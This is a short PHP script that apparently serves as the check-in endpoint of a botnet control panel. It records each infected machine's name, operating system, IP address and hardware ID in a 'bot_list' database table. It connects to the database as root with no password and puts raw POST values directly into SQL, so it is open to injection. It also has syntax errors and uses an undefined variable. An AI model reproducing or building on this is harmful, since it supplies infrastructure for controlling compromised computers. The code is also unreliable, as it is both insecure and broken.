<?php					
	$pcname = $_POST['pcname'];
	$os = $_POST['os'];
	$bit = $_POST['osversion'];
	$ip = $_POST['ip'];
	$hwid = $_POST['hwid'];
	
	$server = mysqli_connect("localhost", "root", "", "autoit");
	$query = mysqli_query($server, "INSERT INTO `bot_list`(`pcname`, `os`, `bit`, `ip`, `hwid`) VALUES ('$pcname','$os','$bit','$ip','$hwid')")
	
	if(isset($_POST['pcname'])) 
	{
		$query = mysqli_query($server, "select * from bot_list");
		if($result['column']) == $pcname) 
		{
			mysqli_close($server)
		}
	}
?>